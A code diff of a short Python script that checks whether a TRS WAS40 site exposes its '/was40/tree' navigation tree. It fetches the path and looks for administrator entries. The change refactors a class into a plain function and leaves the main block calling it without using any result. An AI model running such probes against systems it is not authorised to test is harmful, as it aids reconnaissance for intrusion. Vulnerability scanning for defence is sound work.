@@ -9,20 +9,13 @@ description: 访问was40/tree可查看信息导航树。
 import sys
 import requests
 import warnings
-
-
-
-class was40_tree_disclosure:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['TRS was40 tree导航树泄露','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/was40/tree"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"tree?treekind=navigate" in req.text and r"administrator" in req.text:
@@ -37,5 +30,5 @@ class was40_tree_disclosure:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = was40_tree_disclosure(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
